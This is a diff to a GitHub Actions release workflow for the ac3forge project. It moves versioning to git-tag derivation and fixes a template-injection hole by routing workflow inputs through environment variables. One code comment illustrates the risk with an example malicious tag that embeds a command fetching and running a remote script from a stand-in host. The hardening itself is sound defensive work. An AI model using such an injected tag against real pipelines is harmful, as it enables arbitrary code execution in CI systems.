@@ -8,22 +8,21 @@
 # copy, not to reinvent.
 #
 # ---------------------------------------------------------------------------
-# Versioning: the tag is validated against CMakeLists.txt, not derived from it
+# Versioning: the tag IS the version, same as aqualink-automate
 # ---------------------------------------------------------------------------
-# aqualink-automate derives its version FROM the git tag at configure time
-# (cmake/GitVersionDerivation.cmake) - the tag is the only source of truth,
-# and CMakeLists.txt never hardcodes a version at all. ac3forge does the
-# opposite on purpose: `project(ac3forge VERSION ...)` stays the source of
-# truth (see the comment beside it, and cmake/GenerateVersion.cmake's git
-# provenance stamping, which layers ON TOP of that hardcoded version rather
-# than replacing it). Rearchitecting that was judged too large a change to
-# bundle into standing up release automation.
+# cmake/GitVersionDerivation.cmake derives `project(ac3forge VERSION ...)`
+# from the nearest reachable v* git tag at configure time, before project()
+# runs - see that file. Nothing in the tree hardcodes a version to keep in
+# sync with the tag anymore, so `resolve-version` below only validates the
+# tag's own shape (strict SemVer) and provenance (cut from main, not already
+# used) - there is no CMakeLists.txt number left to compare it against.
 #
-# The `resolve-version` job instead enforces that the two stay in sync at
-# release time: it fails fast if the pushed tag's version doesn't match
-# CMakeLists.txt's project() VERSION, rather than silently packaging
-# something mislabelled. Bump CMakeLists.txt (and vcpkg.json - see the
-# comment beside its "version" field) and merge to main BEFORE tagging.
+# `build-packages` threads the resolved tag into _build.yml as both
+# `fetch_depth: 0` (so `git describe` can actually see it) and `version_tag`
+# (a `-DDERIVED_VERSION_OVERRIDE=` override, which is what makes the
+# workflow_dispatch path below stamp correctly: `github-release` only pushes
+# the tag at the very end, after this job has already built, so `git
+# describe` alone would find nothing yet).
 #
 # ---------------------------------------------------------------------------
 # Signing: GPG (human identity) + Sigstore (keyless build provenance)
@@ -85,16 +84,29 @@ jobs:
       - name: Resolve and validate version
         id: resolve
         shell: bash
+        # Read every ${{ }} context value through env: rather than
+        # interpolating it straight into the script text. inputs.version and
+        # github.ref_name are both attacker-reachable (a workflow_dispatch
+        # caller, or anyone who can push a tag) - substituted directly they'd
+        # be shell CODE, not data, and a tag like 'v1.0.0$(curl evil.sh|sh)'
+        # would execute. As an env var, the shell only ever sees it as the
+        # value of $VERSION_TAG_INPUT etc. (zizmor: template-injection).
+        env:
+          EVENT_NAME: ${{ github.event_name }}
+          VERSION_TAG_INPUT: ${{ inputs.version }}
+          DRY_RUN_INPUT: ${{ inputs.dry_run }}
+          PRERELEASE_INPUT: ${{ inputs.prerelease }}
+          REF_NAME: ${{ github.ref_name }}
         run: |
           set -euo pipefail
           semver_re='^v[0-9]+\.[0-9]+\.[0-9]+(-(alpha|beta|rc)\.[0-9]+)?$'
 
-          if [ "${{ github.event_name }}" = "workflow_dispatch" ]; then
-            version_tag="${{ inputs.version }}"
-            is_dry_run="${{ inputs.dry_run }}"
-            manual_prerelease="${{ inputs.prerelease }}"
+          if [ "$EVENT_NAME" = "workflow_dispatch" ]; then
+            version_tag="$VERSION_TAG_INPUT"
+            is_dry_run="$DRY_RUN_INPUT"
+            manual_prerelease="$PRERELEASE_INPUT"
           else
-            version_tag="${{ github.ref_name }}"
+            version_tag="$REF_NAME"
             is_dry_run="false"
             manual_prerelease="false"
           fi
@@ -110,16 +122,6 @@ jobs:
           is_prerelease="false"
           if [[ "$version_tag" == *-* ]] || [ "$manual_prerelease" = "true" ]; then
             is_prerelease="true"
-          fi
-
-          # See the file header: the tag does not derive ac3forge's version,
-          # it is checked against it. A mismatch here means someone tagged
-          # before bumping CMakeLists.txt (or forgot vcpkg.json) - fail
-          # before packaging something mislabelled, not after.
-          cmake_version=$(grep -oP '(?<=VERSION )[0-9]+\.[0-9]+\.[0-9]+' CMakeLists.txt | head -1)
-          if [ "$bare_version" != "$cmake_version" ]; then
-            echo "::error::tag $version_tag (version $bare_version) does not match CMakeLists.txt's project() VERSION $cmake_version. Bump CMakeLists.txt (and vcpkg.json) to $bare_version and merge to main before tagging."
-            exit 1
           fi
 
           # Dry runs skip both checks below: no tag is ever pushed or
@@ -165,6 +167,13 @@ jobs:
     uses: ./.github/workflows/_build.yml
     with:
       do_package: true
+      # Full history + tags: GitVersionDerivation.cmake's `git describe` needs
+      # to see the tag. version_tag also overrides it outright, which matters
+      # specifically for workflow_dispatch - github-release only pushes the
+      # tag at the very end, after this job has already built and packaged,
+      # so `git describe` alone would find nothing (or the previous release).
+      fetch_depth: 0
+      version_tag: ${{ needs.resolve-version.outputs.version_tag }}
 
   # Downloads whatever packages actually got built, signs and attests them,
   # generates an SBOM, and publishes the GitHub Release. Skipped entirely on
@@ -185,6 +194,11 @@ jobs:
       # failing a release that has not provisioned a signing key yet.
       HAVE_GPG_KEY: ${{ secrets.REPO_GPG_PRIVATE_KEY != '' && 'true' || 'false' }}
     steps:
+      # persist-credentials is deliberately left at its default (true), not
+      # false: "Push release tag" below runs a plain `git push origin "$TAG"`
+      # against this checkout, which needs the token actions/checkout leaves
+      # behind. Every other checkout in this repo sets persist-credentials:
+      # false (it isn't needed there) - this is the one job where it is.
       - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
 
       - name: Download package artifacts
@@ -371,6 +385,10 @@ jobs:
     permissions:
       contents: write
     steps:
+      # persist-credentials left at its default (true) for the same reason as
+      # the github-release job above: "Delete orphaned tag" pushes a tag
+      # deletion with plain git, not gh, and needs the token this leaves
+      # behind.
       - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
 
       - name: Delete orphaned tag, if it was pushed
